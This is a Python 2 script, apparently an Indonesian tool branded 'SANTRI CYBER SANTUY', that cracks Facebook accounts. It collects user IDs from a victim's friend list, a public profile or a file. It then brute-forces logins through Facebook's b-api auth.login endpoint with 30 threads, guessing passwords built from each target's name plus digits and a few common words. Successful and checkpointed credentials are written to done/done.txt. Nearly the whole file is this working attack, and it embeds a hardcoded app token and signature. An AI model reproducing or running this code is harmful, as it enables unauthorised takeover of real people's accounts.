#!/usr/bin/python2
# coding=utf-8
import os,sys,time,mechanize,itertools,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib
from multiprocessing.pool import ThreadPool

try:
    import mechanize
except ImportError:
    os.system("pip2 install mechanize")
try:
    import requests
except ImportError:
    os.system("pip2 install requests")
    os.system("python2 kkr.py")
from requests.exceptions import ConnectionError
from mechanize import Browser
from datetime import datetime

reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

os.system("clear")

def keluar():
    print "Thx sudah pakai tools saya ^_^"
    os.sys.exit()
def acak(x):
    w = 'mhkbpcP'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d) 
def cetak(x):
    w = 'mhkbpcP'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'%s;'%str(31+j))
    x += ''
    x = x.replace('!0','')
    sys.stdout.write(x+'\n')
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)
#########LOGO#########
logo = """
╔═════════════════════════════════════════════╗
║             SANTRI CYBER SANTUY             ║
║═════════════════════════════════════════════║
║     Crack Akun Facebook Indonesia only      ║
╚═════════════════════════════════════════════╝
> JANGAN LUPA ISTIGHFAR KITA SEMUA PENDOSA CUK <
╔═════════════════════════════════════════════╗
║ Author   : SANTRI CYBER SANTUY              ║
║ Facebook : MASUKAN ID GW : SANTRI.CYBER.CUK ║
║ Github   : https://github.com/AKKUSANTUY    ║
║ Instagram: @Akku_Santuy & @Santri_Cyber_    ║
║ Youtube  : Akku Santuy Cari Ajaa Cuk        ║
║ TikTod   : Ngak Punya Cuk Uninstall Ajaa    ║
║ WhatsApp : +6288221708799                   ║
╚═════════════════════════════════════════════╝
[!]MERENDAH SAMPAI TIDAK ADA YANG MERENDAHKAN[!]"""
back = 0
threads = []
berhasil = []
cekpoint = []
oks = []
oke = []
id = []
###### MASUK ######
def masuk():

    os.system('clear')
    os.system('neofetch')
    print logo

    print 50* "─"
    print "Gunakan token facebook untuk login Cuk"
    print ">>>tarek sess semongko<<<"
    print "[1] Login Dengan token"
    print "[2] Dapatkan token Facebook"
    print "[3] Update Script Cuk"
    print "[0] Keluar Aht"
    print ">>>iri bilang boss<<<"
    print 50* "─"
    pilih_masuk()

def pilih_masuk():
    msuk = raw_input("[SCS] Pilih Nomer Cuk : ")
    if msuk =="":
        print"[!] Pilih salah satu opsi"
        pilih_masuk()
    elif msuk =="1" or msuk =="01":
        tokenz()
    elif msuk =="2"or msuk =="02":
        ambil_link()
    elif msuk =="3"or msuk =="03":
        update_sc()
    elif msuk =="0" or msuk =="00":
        keluar()
    else:
        print"[!] Opsi tidak ada !"
        pilih_masuk()
#####LOGIN_TOKENZ#####
def tokenz():
    os.system('clear')
    print logo
    print 50* "─"
    toket = raw_input("[?] Token : ")
    try:
        otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
        a = json.loads(otw.text)
        zedd = open("login.txt", 'w')
        zedd.write(toket)
        zedd.close()
        print '[✓] Login berhasil ter'
        menu()
    except KeyError:
        print "[!] Token Mungkin Salah/Kadalwarsa"
        time.sleep(1.7)
        masuk()
        os.system("python2 Cracked.py")
##### AMBIL LINK #####
def ambil_link():
    os.system("clear")
    print logo
    print 50* "─"
    jalan("anda akan dialihkan ke browser untuk mendownload aplikasi monokai toolkit")
    jalan ("silahkan ambil token dari aplikasi monokai tersebut")
    os.system('xdg-open https://play.google.com/store/apps/details?id=com.nstudio.mtoolkit')
    raw_input("\n[ enter untuk melanjutkan]")
    masuk()
##### UPDATE SC #####
def update_sc():
    os.system("clear")
    print logo
    print "──────────────────────────────────────────────────"
    print "Updating Script ..."
    os.system("git pull origin master")
    print "update selesai"
    raw_input("\n[Kembali] ? ?")
    os.system("python2 Cracked.py")
    masuk() 
###### MENU #######
def menu():
    os.system('clear')
    try:
        toket = open('login.txt','r').read()
    except IOError:
        print "[!] Token kadalwarsa Cuk !"
        print "[!] Masukkan Token baru Cuk !"
        os.system('clear')
        os.system('rm -rf login.txt')
        masuk()
    try:
        otw = requests.get('https://graph.facebook.com/me/?access_token='+toket)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
    except KeyError:
        os.system('clear')
        print"[!] Token yang anda masukkan mungkin salah/kadalwarsa Cuk"
        os.system('rm -rf login.txt')
        time.sleep(1)
        masuk()
        time.sleep(1)
        masuk()
    except requests.exceptions.ConnectionError:
        print"[!] Tidak ada koneksi internet Cuk"
        print"[!] Coba aktifkan wifi/data seluler kamu cuk"
        keluar()
    os.system("clear")
    print logo
    print 50* "─"
    print "[•] NICK  : " +nama
    print "[•] ID    : " + id
    print 50* "─"
    print "[1] CRACK ID DARI FL/PUBLIK ?"
    print "[2] AMBIL ID DARI USERNAME ?"
    print "[0] Keluar ?"
    print 50* "─"
    pilih()
######PILIH######
def pilih():
    unikers = raw_input("[?] : ")
    if unikers =="":
        print"[!] Pilih salah satu opsi !"
        pilih()
    elif unikers =="1" or unikers =="01":
        crack_indo()
    elif unikers =="2" or unikers =="02":
        user_id()
    elif unikers =="0" or unikers =="00":
        os.system('clear')
        jalan('Menghapus token')
        os.system('rm -rf login.txt')
        keluar()
    else:
        print"[!] Opsi Tidak ada !"
        pilih()

##### CRACK  INDONESIA #####
def crack_indo():
    global toket
    os.system('clear')
    try:
        toket=open('login.txt','r').read()
    except IOError:
        print"[!] Token yang anda masukkan mungkin salah/kadalwarsa"
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()
    os.system('clear')
    print logo
    print 50* "─"
    print "[1] CRACK ID FL ?"
    print "[2] CRACK ID PUBLIC ?"
    print "[3] CRACK ID FROM FILE ?"
    print "[0] Kembali"
    print 50* "─"
    pilih_indo()

#### PILIH INDONESIA ####
def pilih_indo():
    teak = raw_input("[?] : ")
    if teak =="":
        print"[!] Pilih salah satu opsi"
        pilih_indo()
    elif teak =="1" or teak =="01":
        os.system('clear')
        print logo
        print 50* "─"
        print ("[●][CRACK FRIEND LIST")
        print 50* "─"
        r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
        z = json.loads(r.text)
        for s in z['data']:
            id.append(s['id'])
    elif teak =="2" or teak =="02":
        os.system('clear')
        print logo
        print 50* "─"
        print ("[●][CRACK PUBLIC]")
        print 50* "─"
        idt = raw_input("[●] ID Target : ")
        try:
            pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
            sp = json.loads(pok.text)
            print"[●] Nick Target "+sp["name"]
        except KeyError:
            print"[!] ID publik/fl tidak ada !"
            raw_input("\n\[Kembali] ?")
            crack_indo()
        except requests.exceptions.ConnectionError:
            print"[!] Tidak ada koneksi internet !"
            keluar()
        r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
        z = json.loads(r.text)
        for i in z['data']:
            id.append(i['id'])
    elif teak =="3" or teak =="03":
        os.system('clear')
        print logo
        try:
            print 50* "─"
            print ("[●] CRACK FROM FILE")
            print 50* "─"
            idlist = raw_input('[●] Nama File : ')
            for line in open(idlist,'r').readlines():
                id.append(line.strip())
        except KeyError:
            print '[!] File tidak ada ! '
            raw_input('\n[KEMBALI] ?')
        except IOError:
            print '[!] File tidak ada !'
            raw_input("\n[KEMBALI] ?")
            crack_indo()
    elif teak =="0" or teak =="00":
        menu()
    else:
        print"[!] Opsi Tidak Ada !"
        pilih_indo()
    
    print "[●] Total ID Target : "+str(len(id))
    print('[-] Untuk Berhenti & Menyimpan Hasil Crack , Tekan CTRL+Z')
    titik = ['.   ','..  ','... ']
    for o in titik:
        print("\r[!] Crack sedang berlangsung Cuk "+o),;sys.stdout.flush();time.sleep(1)
    print("\n[-] Sabar Ya Cuk")
    print ("──────────────────────────────────────────────────")
##### MAIN INDONESIA #####
    def main(arg):
        global cekpoint,oks
        zowe = arg
        try:
            os.mkdir('done')
        except OSError:
            pass
        try:
            an = requests.get('https://graph.facebook.com/'+zowe+'/?access_token='+toket)
            j = json.loads(an.text)
            bos1 = j['first_name'].lower()+'123'
            data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
            ko = json.load(data)
            if 'access_token' in ko:
                print ("\n[✓] OKOK")
                print ("[N] Nama     : ") + j['name']
                print ("[I] ID       : ") + zowe
                print ("[P] Password : ") + bos1
                oke = open("done/done.txt", "a")
                oke.write("\n[✓] OKOK \n[-] Nama     :" +j['name']+ "\n[-] User     > " +zowe+ "\n[P] Password > " +bos1+"\n")
                oke.close()
                oks.append(zowe)
            else:
                if 'www.facebook.com' in ko['error_msg']:
                    print ("\n[-] CP")
                    print ("[N] Nama     : ") + j['name']
                    print ("[I] ID       : ") + zowe
                    print ("[P] Password : ") + bos1
                    cek = open("done/done.txt", "a")
                    cek.write("\n[-] CP \n[-] Nama     :" +j['name']+ "\n[-] User     > " +zowe+ "\n[P] Password > " +bos1+"\n")
                    cek.close()
                    cekpoint.append(zowe)
                else:
                    bos2 = j['first_name'].lower()+'1234'
                    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                    ko = json.load(data)
                    if 'access_token' in ko:
                        print ("\n[✓] OKOK")
                        print ("[N] Nama     : ") + j['name']
                        print ("[I] ID       : ") + zowe
                        print ("[P] Password : ") + bos2
                        oke = open("done/done.txt", "a")
                        oke.write("\n[✓] OKOK \n[-] Nama     :" +j['name']+ "\n[-] User     > " +zowe+ "\n[P] Password > " +bos2+"\n")
                        oke.close()
                        oks.append(zowe)
                    else:
                        if 'www.facebook.com' in ko['error_msg']:
                            print ("\n[-] CP")
                            print ("[N] Nama     : ") + j['name']
                            print ("[I] ID       : ") + zowe
                            print ("[P] Password : ") + bos2
                            cek = open("done/done.txt", "a")
                            cek.write("\n[-] CP \n[-] Nama     :" +j['name']+ "\n[-] User     > " +zowe+ "\n[P] Password > " +bos2+"\n")
                            cek.close()
                            cekpoint.append(zowe)
                        else:
                            bos3 = j['first_name'].lower()+'12345'
                            data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                            ko = json.load(data)
                            if 'access_token' in ko:
                                print ("\n[✓] OKOK")
                                print ("[N] Nama     : ") + j['name']
                                print ("[I] ID       : ") + zowe
                                print ("[P] Password : ") + bos3
                                oke = open("done/done.txt", "a")
                                oke.write("\n[✓] OKOK \n[-] Nama     :" +j['name']+ "\n[-] User     > " +zowe+ "\n[P] Password > " +bos3+"\n")
                                oke.close()
                                oks.append(zowe)
                            else:
                                if 'www.facebook.com' in ko['error_msg']:
                                    print ("\n[-] CP")
                                    print ("[N] Nama     : ") + j['name']
                                    print ("[I] ID       : ") + zowe
                                    print ("[P] Password : ") + bos3
                                    cek = open("done/done.txt", "a")
                                    cek.write("\n[-] CP \n[-] Nama     :" +j['name']+ "\n[-] User     > " +zowe+ "\n[P] Password > " +bos3+"\n")
                                    cek.close()
                                    cekpoint.append(zowe)
                                else:
                                    bos4 = ('sayang')
                                    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                    ko = json.load(data)
                                    if 'access_token' in ko:
                                        print ("\n[✓] OKOK")
                                        print ("[N] Nama     : ") + j['name']
                                        print ("[I] ID       : ") + zowe
                                        print ("[P] Password : ") + bos4
                                        oke = open("done/done.txt", "a")
                                        oke.write("\n[✓] OKOK \n[-] Nama     :" +j['name']+ "\n[-] User     > " +zowe+ "\n[P] Password > " +bos4+"\n")
                                        oke.close()
                                        oks.append(zowe)
                                    else:
                                        if 'www.facebook.com' in ko['error_msg']:
                                            print ("\n[-] CP")
                                            print ("[N] Nama     : ") + j['name']
                                            print ("[I] ID       : ") + zowe
                                            print ("[P] Password : ") + bos4
                                            cek = open("done/done.txt", "a")
                                            cek.write("\n[-] CP \n[-] Nama     :" +j['name']+ "\n[-] User     > " +zowe+ "\n[P] Password > " +bos4+"\n")
                                            cek.close()
                                            cekpoint.append(zowe)
                                        else:
                                            bos5 = ('bangsat')
                                            data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                            ko = json.load(data)
                                            if 'access_token' in ko:
                                                print ("\n[✓] OKOK")
                                                print ("[N] Nama     : ") + j['name']
                                                print ("[I] ID       : ") + zowe
                                                print ("[P] Password : ") + bos5
                                                oke = open("done/done.txt", "a")
                                                oke.write("\n[✓] OKOK \n[-] Nama     :" +j['name']+ "\n[-] User     > " +zowe+ "\n[P] Password > " +bos5+"\n")
                                                oke.close()
                                                oks.append(zowe)
                                            else:
                                                if 'www.facebook.com' in ko['error_msg']:
                                                    print ("\n[-] CP")
                                                    print ("[N] Nama     : ") + j['name']
                                                    print ("[I] ID       : ") + zowe
                                                    print ("[P] Password : ") + bos5
                                                    cek = open("done/done.txt", "a")
                                                    cek.write("\n[-] CP \n[-] Nama     :" +j['name']+ "\n[-] User     > " +zowe+ "\n[P] Password > " +bos5+"\n")
                                                    cek.close()
                                                    cekpoint.append(zowe)
                                                else:
                                                    bos6 = ('anjing')
                                                    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                                    ko = json.load(data)
                                                    if 'access_token' in ko:
                                                        print ("\n[✓] OKOK")
                                                        print ("[N] Nama     : ") + j['name']
                                                        print ("[I] ID       : ") + zowe
                                                        print ("[P] Password : ") + bos6
                                                        oke = open("done/done.txt", "a")
                                                        oke.write("\n[✓] OKOK \n[-] Nama     :" +j['name']+ "\n[-] User     > " +zowe+ "\n[P] Password > " +bos6+"\n")
                                                        oke.close()
                                                        oks.append(zowe)
                                                    else:
                                                        if 'www.facebook.com' in ko['error_msg']:
                                                            print ("\n[-] CP")
                                                            print ("[N] Nama     : ") + j['name']
                                                            print ("[I] ID       : ") + zowe
                                                            print ("[P] Password : ") + bos6
                                                            cek = open("done/done.txt", "a")
                                                            cek.write("\n[-] CP \n[-] Nama     :" +j['name']+ "\n[-] User     > " +zowe+ "\n[P] Password > " +bos6+"\n")
                                                            cek.close()
                                                            cekpoint.append(zowe)
                                                        else:
                                                            bos7 = ('kontol')
                                                            data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                                            ko = json.load(data)
                                                            if 'access_token' in ko:
                                                                print ("\n[✓] OKOK")
                                                                print ("[N] Nama     : ") + j['name']
                                                                print ("[I] ID       : ") + zowe
                                                                print ("[P] Password : ") + bos7
                                                                oke = open("done/done.txt", "a")
                                                                oke.write("\n[✓] OKOK \n[-] Nama     :" +j['name']+ "\n[-] User     > " +zowe+ "\n[P] Password > " +bos7+"\n")
                                                                oke.close()
                                                                oks.append(zowe)
                                                            else:
                                                                if 'www.facebook.com' in ko['error_msg']:
                                                                    print ("\n[-] CP")
                                                                    print ("[N] Nama     : ") + j['name']
                                                                    print ("[I] ID       : ") + zowe
                                                                    print ("[P] Password : ") + bos7
                                                                    cek = open("done/done.txt", "a")
                                                                    cek.write("\n[-] CP \n[-] Nama     :" +j['name']+ "\n[-] User     > " +zowe+ "\n[P] Password > " +bos7+"\n")
                                                                    cek.close()
                                                                    cekpoint.append(zowe)
                                                                else:
                                                                    bos8 = j['last_name'].lower()+'123'
                                                                    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                                                    ko = json.load(data)
                                                                    if 'access_token' in ko:
                                                                        print ("\n[✓] OKOK")
                                                                        print ("[N] Nama     : ") + j['name']
                                                                        print ("[I] ID       : ") + zowe
                                                                        print ("[P] Password : ") + bos8
                                                                        oke = open("done/done.txt", "a")
                                                                        oke.write("\n[✓] OKOK \n[-] Nama     :" +j['name']+ "\n[-] User     > " +zowe+ "\n[P] Password > " +bos8+"\n")
                                                                        oke.close()
                                                                        oks.append(zowe)
                                                                    else:
                                                                        if 'www.facebook.com' in ko['error_msg']:
                                                                            print ("\n[-] CP")
                                                                            print ("[N] Nama     : ") + j['name']
                                                                            print ("[I] ID       : ") + zowe
                                                                            print ("[P] Password : ") + bos8
                                                                            cek = open("done/done.txt", "a")
                                                                            cek.write("\n[-] CP \n[-] Nama     :" +j['name']+ "\n[-] User     > " +zowe+ "\n[P] Password > " +bos8+"\n")
                                                                            cek.close()
                                                                            cekpoint.append(zowe)
                                                                            
        except:
            pass
            
    p = ThreadPool(30)
    p.map(main, id)
    print "\n──────────────────────────────────────────────────"
    print '[●] Selesai Cuk !'
    print"{●} Total OK/CP : "+str(len(oks))+"/"+str(len(cekpoint))
    print '{●} OK/CP Sudah disimpan di : done/done.txt'
    print 50* "─"
    raw_input("[KEMBALI] ?")
    os.system("python2 CRK.py")

##### USERNAME ID ####
def user_id():
    os.system('clear')
    print logo
    print 50* "─"
    print "Masukkan username , \ncontoh :www.facebook.com/SANTRI.CYBER.CUK\nhanya masukkan (SANTRI.CYBER.CUK) nya saja, tanpa tanda kurung"
    ling = ('https://www.facebook.com/')
    url = ling+raw_input("[-] Username : ")
    idre = re.compile('"entity_id":"([0-9]+)"')
    page = requests.get(url)
    print idre.findall(page.content)
    raw_input("\n[Kembali] ?")
    menu()

if __name__=='__main__':
    menu()
    masuk()